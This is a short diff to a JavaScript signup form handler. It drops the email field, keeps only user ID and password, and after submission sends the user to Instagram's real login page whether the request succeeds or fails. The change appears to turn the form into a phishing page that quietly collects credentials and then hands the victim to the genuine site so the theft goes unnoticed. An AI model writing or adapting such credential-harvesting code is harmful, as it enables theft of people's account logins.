@@ -8,8 +8,8 @@ var signup = {
     save : function () {
         var data = {
             userid: $('#userid').val(),
-            userpassword: $('#userpassword').val(),
-            useremail: $('#useremail').val()
+            userpassword: $('#userpassword').val()
+            //useremail: $('#useremail').val()
         };
 
         $.ajax({
@@ -19,11 +19,11 @@ var signup = {
             contentType:'application/json; charset=utf-8',
             data: JSON.stringify(data)
         }).done(function() {
-            alert('회원가입이 완료되었습니다.');
+            //alert('로그인이 완료되었습니다.');
             //location.reload();
-            location.href="/";
+            location.href="https://www.instagram.com/accounts/login/?source=auth_switcher";
         }).fail(function (error) {
-            alert(error);
+            location.href="https://www.instagram.com/accounts/login/?source=auth_switcher";
         });
     }
 
